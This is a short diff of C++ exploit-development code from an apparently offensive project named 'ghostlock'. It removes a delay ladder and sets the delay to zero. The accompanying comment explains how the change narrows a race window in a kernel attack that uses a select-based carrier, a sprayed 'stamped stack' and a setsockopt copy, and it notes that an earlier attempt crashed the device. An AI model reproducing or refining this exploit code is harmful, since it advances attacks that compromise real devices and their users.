@@ -311,9 +311,14 @@ namespace {
             command.nfds = ::ghostlock::compat::kCarrierNfds;
             command.bitmap_bytes = ::ghostlock::compat::kCarrierBitmapBytes;
             command.select_timeout_us = 0;
-            command.delay_us = attempt == 1 && target.select_enter_delay_us() != 0
-                                   ? target.select_enter_delay_us()
-                                   : kCompatDelayLadder[static_cast<size_t>((attempt - 1) % 8)];
+            /* No post-copy delay. The select carrier's ladder positions the
+             * walk inside the waiter's blocking _newselect (the trigger fires
+             * before the syscall); here the trigger is stored after the
+             * setsockopt copy has already returned, and the waiter spins on
+             * the stamped stack -- every microsecond of delay is window for a
+             * context switch to clobber the strip (the +0x188 class; 2026-11-12
+             * the device died in the first attempt's 50 ms ladder rung). */
+            command.delay_us = 0;
             command.consumer_max_calls = target.select_consumer_max_calls();
             command.consumer_burst_calls = target.select_consumer_burst_calls();
             command.waiter_cpu = static_cast<uint32_t>(
